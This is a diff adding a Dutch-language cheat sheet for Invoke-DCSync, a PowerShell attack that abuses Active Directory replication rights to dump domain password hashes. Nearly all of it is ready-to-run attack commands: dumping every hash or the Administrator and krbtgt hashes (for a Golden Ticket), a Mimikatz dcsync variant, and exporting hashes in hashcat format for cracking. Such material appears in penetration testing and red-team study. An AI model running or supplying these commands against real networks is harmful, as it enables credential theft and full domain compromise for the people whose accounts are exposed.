@@ -1,0 +1,43 @@
+# Invoke-DCSync — DCSync aanval via PowerShell
+# Dumpt wachtwoord hashes via MS-DRSR (Directory Replication Service) replicatie
+#
+# === Syntax ===
+# Invoke-DCSync [-Domain domain.local] [-DomainController DC] [-Users user1,user2]
+#
+# === Werking ===
+# Misbruikt replicatie rechten (Replicating Directory Changes / All)
+# om wachtwoord hashes op te halen zonder LSASS aan te raken.
+# Simuleert een Domain Controller die replicatie data opvraagt.
+#
+# === Opties ===
+# -Domain             Domeinnaam (standaard: huidig domein)
+# -DomainController   Specifieke DC om te targeten
+# -Users              Komma-gescheiden lijst van gebruikers
+# -OutputFormat        Hashcat of JohnTheRipper
+#
+# === Voorbeelden ===
+
+# Alle domain hashes dumpen
+Invoke-DCSync -Domain DOMAIN
+
+# Specifieke gebruikers
+Invoke-DCSync -Domain DOMAIN -Users "Administrator,krbtgt"
+
+# Met specifieke Domain Controller
+Invoke-DCSync -Domain DOMAIN -DomainController DC01.DOMAIN
+
+# Alleen krbtgt hash (voor Golden Ticket)
+Invoke-DCSync -Domain DOMAIN -Users "krbtgt"
+
+# PowerView variant (Get-DomainUser + replication)
+Get-DomainUser -Identity krbtgt -Domain DOMAIN -Server DC01.DOMAIN -Properties samaccountname,objectsid
+
+# Mimikatz variant via PowerShell
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt"'
+
+# Hashcat output voor kraken
+Invoke-DCSync -Domain DOMAIN -OutputFormat Hashcat | Out-File dcsync_hashes.txt
+
+# NOTE: Vereist Replicating Directory Changes + Replicating Directory Changes All
+# NOTE: Standaard hebben Domain Admins en DC accounts deze rechten
+# NOTE: Werkt remote — geen code execution op de DC nodig
